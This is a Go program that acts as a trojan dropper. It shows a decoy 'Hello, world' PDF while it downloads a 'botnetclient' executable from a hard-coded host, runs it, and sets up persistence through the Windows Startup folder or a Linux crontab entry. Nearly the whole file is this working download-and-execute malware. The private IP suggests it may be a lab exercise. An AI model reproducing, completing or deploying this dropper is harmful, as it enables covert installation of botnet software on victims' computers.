package main

import (
	"fmt"
	"github.com/jung-kurt/gofpdf"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
)

var home, _ = os.UserHomeDir()

var here, _ = os.Getwd()

var opersys = runtime.GOOS

var pdfName = filepath.FromSlash("./hello.pdf")

var clientName string

func createpdf() {
	//create pdf
	pdf := gofpdf.New("P", "mm", "A4", "")
	pdf.AddPage()
	pdf.SetFont("Arial", "B", 16)
	pdf.Cell(40, 10, "Hello, world")
	err := pdf.OutputFileAndClose(pdfName)
	if err != nil {
		log.Println("Error:", err)
	}
}

func openpdf() {
	//open pdf
	switch opersys {
	case "windows":
		cmd1 := exec.Command("cmd.exe", "/C", "start", pdfName)
		if err := cmd1.Run(); err != nil {
			log.Println("Error:", err)
		}
	case "linux":
		fmt.Printf("PDF downloaded to %s\n", pdfName)
	case "default":
		fmt.Println("OS unsupported")
		os.Exit(1)
	}

}

func getclient() {
	//download client
	// Create the file
	out, err := os.Create(clientName)
	if err != nil {
		log.Fatalf("An Error Occured %v", err)
	}
	defer out.Close()

	err = os.Chmod(clientName, 0777)

	// Get the data
	var resp *http.Response
	switch opersys {
	case "windows":
		resp, err = http.Get("http://192.168.121.128:8081/client-windows.exe")
	case "linux":
		resp, err = http.Get("http://192.168.121.128:8081/client-linux")
	case "default":
		fmt.Println("unsupported OS")
		os.Exit(1)
	}
	if err != nil {
		log.Fatalf("An Error Occured %v", err)
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		log.Fatalf("bad status: %s", resp.Status)
	}

	// Writer the body to file
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		log.Fatalf("An Error Occured %v", err)
	}
}

func runclient() {
	err := exec.Command(clientName).Run()
	if err != nil {
		log.Fatalf("An Error Occured %v", err)
	}
	croncmd := "(crontab -l ; echo \"1 * * * * ./home/$USER/Downloads/botnetclient\") | sort - | uniq - | crontab -"
	err = exec.Command(croncmd).Run()
	if err != nil {
		log.Fatalf("An Error Occured %v", err)
	}
}

func main() {

	switch opersys {
	case "windows":
		clientName = filepath.Join(home, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\botnetclient.exe")
	case "linux":
		// cron job probably isn't done here, but where?
		clientName = filepath.FromSlash("./botnetclient")
	case "default":
		fmt.Println("OS will not be supported")
		os.Exit(1)
	}

	createpdf()

	openpdf()

	go getclient()

	time.Sleep(time.Second)

	go runclient()

	time.Sleep(time.Second)

	//TODO delete itself
}
